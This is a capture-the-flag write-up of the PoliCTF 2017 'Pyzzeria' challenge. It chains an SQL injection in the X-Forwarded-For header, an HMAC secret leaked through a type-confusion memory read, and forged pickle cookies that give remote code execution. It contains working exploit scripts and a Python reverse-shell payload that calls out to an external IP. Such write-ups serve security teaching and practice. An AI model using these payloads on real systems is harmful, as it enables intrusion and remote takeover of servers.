---
title: Pyzzeria - polictf 2017
layout: post
categories: posts
date:   2017-07-10 18:54:12 +1000
---

> An evil pyzza-maker has come to town: he is terrorizing the population by putting pineapple in every pyzza he cooks. Nobody can't stop him as long as he is the only one knowing the secret to alter the recipe...
>
> Our intel sources have identified his evil lab, but unfortunately the access seems restricted to his staff only. Can you help us save the Pyzza?

*484 Pts, 3 solved, Grab Bag. http://pyzzeria.chall.polictf.it/pyzzeria*

---

This was a great challenge involving a bunch of different techniques and styles all combined into the one task, from SQLi to reverse engineering.


## Part 1 - Gaining access

After visiting the pyzzeria website we recieve the following access denied message:

{% highlight text %}
The access is currently restricted to staff only ¯\_(ツ)_/¯
{% endhighlight %}

A quick look for`robots.txt` and other default files revieled nothing of interest, but cookies being returned included `AWSALB` indicating the app was behind a load balancer and a `pySess` indicating a python app. If the filter is based on IP it might be possible to bypass it with an `X-Forwarded-For` header.


{% highlight bash %}
curl -H "X-Forwarded-For: 127.0.0.1" http://pyzzeria.chall.polictf.it/pyzzeria 
...
validate_ip() failure: illegal IP address string passed to inet_aton
{% endhighlight %}

Nice we're onto something! @corb3nik from my team OpenToAll then discovered that the header was vulnerable to an SQL injection.

{% highlight bash %}
curl -H "X-Forwarded-For: 127.0.0.2 '" http://pyzzeria.chall.polictf.it/pyzzeria
...
near ",": syntax error
{% endhighlight %}

So trying the stock standard SQLi test:

{% highlight bash %}
curl -H "X-Forwarded-For: 127.0.0.1 ' OR 1=1 --" http://pyzzeria.chall.polictf.it/pyzzeria 
...
<form id="f" action="" method="POST">
	<input type="radio" name="type" value="M" onclick="document.getElementById('leavening').disabled=false;document.getElementById('ingredients').disabled=true">Margherita<br>
	<i>Leavening time:</i>
{% endhighlight %}

Great! We now have access to the main site and can start ordering pizzas.


## Part 2 - Ordering Pizzas
After installing [Modify Header][header] Chrome extension and adding the `X-Forwarded-For` bypass we are shown the pizza order page where we can choose a margherita or stuffed pizza:

![Pizza order page][pizzas]

After submitting a pizza, we are given an order code and a link to the oven at http://pyzzeria.chall.polictf.it/oven 

![Pizza oven page][order]

The oven allows us to enter in an order code and recieve the details for our pizza

![Pizza ready page][oven]

When submitting a pizza, we recieve a `pyzza` cookie that is a large hex string like
{% highlight text %}
pyzza=4d3a59334235656e7068625746795a32686c636d6c30595170516558703659553168636d646f5a584a706447454b6344414b4b464d6e5a57497a5a54453259545a69595751324d7a59334e57497a5a546b3359544a694e5455304d6a45334e6d456e436e4178436b6b784d4170544a334270626d5668634842735a53634b6344494b6448417a436c4a774e416f753a34626636663763303130306563646462646661353735386462653234666533633734363932363939643536343339326465386362336438643638336131646332
{% endhighlight %}

Decoding this results in what looks like some base64 data followed by a hash, which looks suspiciously like it could be hmac.

{% highlight text %}
M:Y3B5enphbWFyZ2hlcml0YQpQeXp6YU1hcmdoZXJpdGEKcDAKKFMnZWIzZTE2YTZiYWQ2MzY3NWIzZTk3YTJiNTU0MjE3NmEnCnAxCkkxMApTJ3BpbmVhcHBsZScKcDIKdHAzClJwNAou:4bf6f7c0100ecddbdfa5758dbe24fe3c74692699d564392de8cb3d8d683a1dc2
{% endhighlight %}

When the base64 data is decoded we start to see where this challenge might be going:

{% highlight text %}
cpyzzamargherita
PyzzaMargherita
p0
(S'eb3e16a6bad63675b3e97a2b5542176a'
p1
I10
S'pineapple'
p2
tp3
Rp4
.
{% endhighlight %}

This is a python object that has been serialized with [Pickle][pickle]! If we are able to send our own serialized data we can [easily gain RCE][pickle-rce]. So lets try modify the cookie and see what happens:

![hmac][hmac]

As expected if failed, but we are told that our request has been logged to http://pyzzeria.chall.polictf.it/warehouse/logs/tampering_attempts. Following that link returns a 403, same with `logs`, but `warehouse` shows directory listing containing `dev`, and inside that are a bunch of shared libraries:

![dev][dev]

After downloading and inspecting all of these, they are compiled python modules that we can import directly in python. The Cuoco class has a some interesting methods including `cook`, `get_secret`, and `get_last_order`. `get_secret` returns `!DUMMY__SECRET!` (which is hardcoded in the binary), so I assumed that the server version would have this modified to the real secret which is used to calculate the HMAC.

## Part 3 - Discovering the HMAC Secret

The `pyzza` cookie contained a type at the start, either `S` or `M`, and I notice that this could be changed without invalidating the HMAC. This allowed us to cook a margherita, but have the status page display it as a stuffed pizza.

After playing around in python we discover few interesting things:

```python
# !/usr/bin/env python

import cuoco
import pyzzaerror
import pyzzamargherita
import pyzzastuffed

c = cuoco.Cuoco(name="aaa", surname="bbb", age=12)

m = pyzzamargherita.PyzzaMargherita("5b5aae7c2cd4d5ea38996f94da4b9ccc", 0x00400000)
s = pyzzastuffed.PyzzaStuffed("5b5aae7c2cd4d5ea38996f94da4b9ccc", "sausage")
e = pyzzaerror.PyzzaError("aaaa", "bbbb")

print "Stuffed as Margherita"
c.cook(s, ord('M'))
print c.get_last_order()

print "\nMargherita as Stuffed"
c.cook(m, ord('S'))
print c.get_last_order()


print "\nError as Stuffed"
c.cook(e, ord('S'))
print c.get_last_order()

print "\nError as Margherita"
c.cook(e, ord('M'))
print c.get_last_order()
```

Output
```
Stuffed as Margherita
Pyzza obj @: 0x7ffff7e8d620
Pyzza type 77
leavening: 9999024
order: sausage
price: 7€

Margherita as Stuffed
Pyzza obj @: 0x7ffff7e8d5d0
Pyzza type 83
ingredients: 5b5aae7c2cd4d5ea38996f94da4b9ccc
order: ELF
price: 5€

Error as Stuffed
Pyzza obj @: 0x7ffff7e8d648
Pyzza type 83
ingredients: aaaa
order: bbbb
price: 1337€

Error as Margherita
Pyzza obj @: 0x7ffff7e8d648
Pyzza type 77
leavening: 10689696
order: aaaa
price: 1337€
```

So we have an arbitary ready when cooking a Margherita pizza as Stuffed, but there is a slight problem in that we need to know the `order` code to be able to check the pizza's status from the web site. We can get around this by brute forcing the `order` code one byte at a time, but the other problem is that we have no idea where the secret is in memory as it's part of `cuoco.so` and due to ASLR could be anywhere.

The other interesting things are we have a heap leake from Stuffed as Margherita, and a pointer leak of `bbbb` from Error as Margherita.

Looking at the cook method in a bit more detail in Binary Ninja, we see at `0x1270` that if `eax` doesn't equal `0x4d` or `0x53` then an error is created with `INVALID` and `invalid test`. 

![cook][cook]

But then at `0x11cc` only `al` is compared when choosing how to cook the pizza, so if we supply a pizza type of `0x1000004d` we can get it to cook an error as a Margherita pizza. This will mean that `get_last_order` will return an `order` of `invalid test` and `leavening` will be the location of `INVALID!`. Looking at the location of `!DUMMY__SECRET!` in the binary, is only 0x44 bytes away!

![cook][cook]

I wrote quick python script to create a pizza, change the type to our large `M`, and submit it to cook. I also set the `AWSALB` cookie to try to ensure that I hit the same app server each time.


```python
# !/usr/bin/env python
import requests

headers = {
	"X-Forwarded-For": "127.0.0.1 ' OR 1=1 -- "
}

data = {
	"type": "M",
	"leavening": 0x1234
}

req = requests.post("http://pyzzeria.chall.polictf.it/pyzzeria", headers=headers, data=data)
c = req.cookies.get("pyzza")

t,obj,hhash = c.decode("hex").split(":")
plain = obj.decode("base64")
enc = plain.encode("base64")

t = "\x10\x00\x00M"
code = "invalid test"

cookies = requests.cookies.RequestsCookieJar()
cookies.set("pyzza", ("%s:%s:%s"%(t,enc,hhash)).encode("hex"))
cookies.set("AWSALB", "BwDMMN42LQAVq+oEpFKAxk4grO5IuF/BnCbfVs6RUIsYPtSwZIVnj2ZasIdfhQOSND3cLn+o+yExUPSyYYbHLMzrFcUvydrBjwSkaJLJxrpjdtXMKCFNj5CsMouV")

resp = requests.post("http://pyzzeria.chall.polictf.it/oven",  data={"order_code": code}, headers=headers,  cookies=cookies)
print resp.text
```

Which returned a leaving time of `140188021826412`! Now we can use the leak from cooking a Margherita as Stuffed to extract the secret one character at a time. I started off testing just the last letter to see if it was the same as the dummy password, and it was! Summiting a `!` successfully returned the order, but trying `Y!` as the last two characters did not work, so brute forcing time.

```python
import requests
import re
import string
import time

secretLength = 15
secretOffset = 0x45
found = ""
start = secretOffset-secretLength+len(found)

for i in range(start, secretOffset):
	foundChar = False
	for ch in string.lowercase + string.uppercase + string.digits:
		code = ch + found
		print "trying " + code
		headers = {
			"X-Forwarded-For": "127.0.0.1 ' OR 1=1 -- "
		}

		data = {
			"type": "M",
			"leavening": str(140188021826412-i)
		}

		time.sleep(5)
		req = requests.post("http://pyzzeria.chall.polictf.it/pyzzeria", headers=headers, data=data)
		cookiess = req.cookies.get("pyzza")

		t,obj,hhash = cookiess.decode("hex").split(":")
		plain = obj.decode("base64")
		enc = plain.encode("base64")

		t = "S"

		cookies = requests.cookies.RequestsCookieJar()
		cookies.set("pyzza", ("%s:%s:%s"%(t,enc,hhash)).encode("hex"))
		cookies.set("AWSALB", "BwDMMN42LQAVq+oEpFKAxk4grO5IuF/BnCbfVs6RUIsYPtSwZIVnj2ZasIdfhQOSND3cLn+o+yExUPSyYYbHLMzrFcUvydrBjwSkaJLJxrpjdtXMKCFNj5CsMouV")


		time.sleep(5)
		resp = requests.post("http://pyzzeria.chall.polictf.it/oven",  data={"order_code": code}, headers=headers,  cookies=cookies)
		respText = resp.text

		if "with extra pineapple" in respText:
			print "***** found: " + code
			found = ch + found
			foundChar = True
			break
		if "Sorry, order verification failed" in respText:
			continue
		else:
			print respText
			print "something went wrong"
			print "code: " + code

	if not foundChar:
		print "no go :("
		break
```

At this stage I didn't realise that the connection throttling could be bypassed by modifying the `X-Forwarded-For` header, so I just paused for 5 seconds between each request and left it running. After a while it had found `0y3y0y3!` as the end of the secret so I changed the seach charaters to just `0y3` and it finished much faster. We now have the secret key `y3y0y3y0y3y0y3!`


## Part 4 - Putting it all together

Now lets see if we can sign our own payloads with the HMAC key:

```python
import hashlib
import hmac
import requests
import pickle
import pyzzastuffed

s = pyzzastuffed.PyzzaStuffed("1234", "sausage")
payload = pickle.dumps(s)

enc = payload.encode("base64")
calcHash = hmac.new(secret, msg=payload, digestmod=hashlib.sha256).hexdigest()

cookies = requests.cookies.RequestsCookieJar()
cookies.set("pyzza", ("S:%s:%s"%(enc,calcHash)).encode("hex"))

resp = requests.post("http://pyzzeria.chall.polictf.it/oven",  data={"order_code": "sausage"}, headers=headers,  cookies=cookies)
```

Success! Final step is to use pickle to get RCE. I first tried with a simple sleep to see if the request waited 10 seconds before returning, which it did.

```python
class PayloadClass(object):
	def __reduce__(self):
		comm = "sleep 10"
		return (os.system, (comm,))

payload = pickle.dumps(PayloadClass())
```

But then I couldn't get any reverse shell working, it would just hang or error out. I thought maybe outgoing network connections were being blocked, but a simple wget to my webserver got through successfully. Perhaps only port 80 is allowed?


```python
#!/usr/bin/env python

import hashlib
import hmac
import requests
import pickle

import os

class PayloadClass(object):
	def __reduce__(self):
		remote_server = "172.104.127.243"
		remote_port = 80
		comm = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""%(remote_server,remote_port)
		return (os.system, (comm,))

payload = pickle.dumps(PayloadClass())

secret = "y3y0y3y0y3y0y3!"
headers = {
  "X-Forwarded-For": "127.0.0.2 ' OR 1=1 --"
}

enc = payload.encode("base64")
calcHash = hmac.new(secret, msg=payload, digestmod=hashlib.sha256).hexdigest()

cookies = requests.cookies.RequestsCookieJar()
cookies.set("pyzza", ("S:%s:%s"%(enc,calcHash)).encode("hex"))


pizza = pickle.loads(payload)

resp = requests.post("http://pyzzeria.chall.polictf.it/oven",  data={"order_code": "sausage"}, headers=headers,  cookies=cookies)
print resp.text
```

Bingo we have a shell and the flag


```text
$ sudo nc -l -p 80
/bin/sh: 0: can't access tty; job control turned off
$ cat /home/polictf/flag
flag{c0w4bung4_p1zz4T1M3}
```



[pizzas]: {{ site.url }}/assets/images/pizza.jpg
[oven]: {{ site.url }}/assets/images/oven.jpg
[order]: {{ site.url }}/assets/images/order.jpg
[hmac]: {{ site.url }}/assets/images/hmac.jpg
[dev]: {{ site.url }}/assets/images/dev.jpg
[cook]: {{ site.url }}/assets/images/cook.jpg
[strings]: {{ site.url }}/assets/images/strings.jpg



[header]: http://mybrowseraddon.com/modify-header-value.html
[pickle]: https://docs.python.org/2/library/pickle.html
[pickle-rce]: https://blog.nelhage.com/2011/03/exploiting-pickle/